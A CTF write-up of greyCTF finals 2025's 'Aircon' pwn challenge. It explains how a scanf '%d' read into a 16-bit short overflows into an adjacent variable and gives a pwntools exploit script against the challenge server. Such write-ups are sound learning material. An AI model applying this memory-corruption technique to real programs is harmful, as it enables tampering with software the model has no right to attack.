---
title: Aircon
date: 2025-06-29
tags: 
- pwn
- author-hartmannsyg
categories: greyCTF finals 2025
---

written by {% person hartmannsyg %}

> Last Monday, I accidentally turned off all 10 air-conditioners at my internship workplace without even realizing it. But what led to this moment? Solve this challenge to find out :)
>
> Goal is to set all air-conditioners to 25 degrees Celsius.
> 16/20 solves

This was the most solved pwn challenge by far, and yet we weren't able to solve it.

## The challenge

{% ccb terminal:true %}
1. Change air-con temp
2. View air-con temps
3. Get flag

> 2

[ID 0] Remote Temp: 20, Actual Temp: 20
[ID 1] Remote Temp: 21, Actual Temp: 21
[ID 2] Remote Temp: 22, Actual Temp: 22
[ID 3] Remote Temp: 23, Actual Temp: 23
[ID 4] Remote Temp: 24, Actual Temp: 24
[ID 5] Remote Temp: 25, Actual Temp: 25
[ID 6] Remote Temp: 26, Actual Temp: 26
[ID 7] Remote Temp: 27, Actual Temp: 27
[ID 8] Remote Temp: 28, Actual Temp: 28
[ID 9] Remote Temp: 29, Actual Temp: 29
{% endccb %}

We have 10 air-con remotes with their own temperature, and 10 actual air-con temperatures.

Our goal is to get all the actual temperatures to 25. However when we try to set one of them to 25:

{% ccb terminal:true %}
1. Change air-con temp
2. View air-con temps
3. Get flag

> 1

Which air-con remote to use:
0

What temperature to set to:
25

Changing temperature on remote ...
Updating temperature of air-con ...

Checking that all air-con temperatures are different ...

Error: Different air-cons have the same temperature displayed! I'm kicking u out!
{% endccb %}

```cpp
void change_aircon_temp(void)

{
  char cVar1;
  long in_FS_OFFSET;
  short remote_no;
  short temp;
  short remote_no_;
  long canary;
  
  canary = *(long *)(in_FS_OFFSET + 0x28);
  remote_no = 0;
  remote_no_ = 0;
  temp = 0;
  puts("\nWhich air-con remote to use: ");
  __isoc99_scanf(&%d,&remote_no);
  remote_no_ = remote_no;
  puts("\nWhat temperature to set to: ");
  __isoc99_scanf(&%d,&temp);
  cVar1 = validate_inputs((int)remote_no,(int)temp);
  if (cVar1 != '\0') {
    puts("\nChanging temperature on remote ... ");
    *(int *)(AIRCON_REMOTE_TEMP + (long)(int)remote_no * 4) = (int)temp;
    puts("Updating temperature of air-con ...");
    *(undefined4 *)(AIRCON_ACTUAL_TEMP + (long)(int)remote_no_ * 4) =
         *(undefined4 *)(AIRCON_REMOTE_TEMP + (long)(int)remote_no * 4);
    cVar1 = aircon_has_same_temps();
    if (cVar1 != '\0') {
                    /* WARNING: Subroutine does not return */
      exit(1);
    }
  }
  if (canary != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return;
}
```

```cpp
undefined8 aircon_has_same_temps(void)

{
  int local_10;
  int local_c;
  
  puts("\nChecking that all air-con temperatures are different ...");
  local_10 = 0;
  do {
    local_c = local_10;
    if (9 < local_10) {
      puts("Successfully updated air-con temperature!\n");
      return 0;
    }
    while (local_c = local_c + 1, local_c < 10) {
      if (*(int *)(AIRCON_REMOTE_TEMP + (long)local_10 * 4) ==
          *(int *)(AIRCON_REMOTE_TEMP + (long)local_c * 4)) {
        puts(
            "\nError: Different air-cons have the same temperature displayed! I\'m kicking u out!\n"
            );
        return 1;
      }
    }
    local_10 = local_10 + 1;
  } while( true );
}
```
We see that it:
- reads for our remote number `remote_no`
- copies it to another variable `remote_no_`
- read the temperature
- validate inputs
- `AIRCON_REMOTE_TEMP[remote_no] = temp`
- `AIRCON_ACTUAL_TEMP[remote_no_] = AIRCON_REMOTE_TEMP[remote_no]`

We can't really overflow offsets either the remote ID or the temperature as `validdate_inputs()` exists:
```cpp
undefined8 validate_inputs(short param_1,short param_2)

{
  undefined8 uVar1;
  
  if ((param_1 < 0) || (9 < param_1)) {
    puts("\nError: Your input air-con remote ID doesn\'t exist!\n");
    uVar1 = 0;
  }
  else if ((param_2 < 20) || (29 < param_2)) {
    puts("\nError: Your input temperature is too cold/hot!\n");
    uVar1 = 0;
  }
  else {
    uVar1 = 1;
  }
  return uVar1;
}
```

So we were kinda stuck here. The only valid inputs are those that do nothing, e.g. for air-con remote ID 5, set temperature to 25. However when I tried that:

{% ccb terminal:true highlight:25 %}
1. Change air-con temp
2. View air-con temps
3. Get flag

> 1

Which air-con remote to use:
5

What temperature to set to:
25

Changing temperature on remote ...
Updating temperature of air-con ...

Checking that all air-con temperatures are different ...
Successfully updated air-con temperature!

1. Change air-con temp
2. View air-con temps
3. Get flag

> 2

[ID 0] Remote Temp: 20, Actual Temp: 25
[ID 1] Remote Temp: 21, Actual Temp: 21
[ID 2] Remote Temp: 22, Actual Temp: 22
[ID 3] Remote Temp: 23, Actual Temp: 23
[ID 4] Remote Temp: 24, Actual Temp: 24
[ID 5] Remote Temp: 25, Actual Temp: 25
[ID 6] Remote Temp: 26, Actual Temp: 26
[ID 7] Remote Temp: 27, Actual Temp: 27
[ID 8] Remote Temp: 28, Actual Temp: 28
[ID 9] Remote Temp: 29, Actual Temp: 29
{% endccb %}

????????

The 0th aircon gets changed?? I wasn't sure what was going on and we kinda got stuck.

## Actual Solution

`%d` actually reads out 32 bits of data, which is greater than `remote_no` and `temp`'s 16 bits (they are `short`).

So when it reads from stdin the temperature of the remote, we can set `remote_no_` along with it.

## Script

```py
from pwn import *
from logging import log
elf = ELF('./aircon')
# context.log_level = 'DEBUG'
# p = process([elf.path])
p = remote('challs.nusgreyhats.org', 35130)
def change(remote, temp, realindex):
    p.sendlineafter(b'>', b'1')
    p.sendlineafter(b':', str(remote).encode())
    p.sendlineafter(b':', str(u32(p16(temp) + p16(realindex))).encode())

change(5, 25, 0)
change(5, 25, 1)
change(5, 25, 2)
change(5, 25, 3)
change(5, 25, 4)
change(5, 25, 5)
change(5, 25, 6)
change(5, 25, 7)
change(5, 25, 8)
change(5, 25, 9)
p.interactive()
```

{% ccb terminal:true %}
Flag: grey{one_rem0te_controls_a11_the_air_conditioners!}
{% endccb %}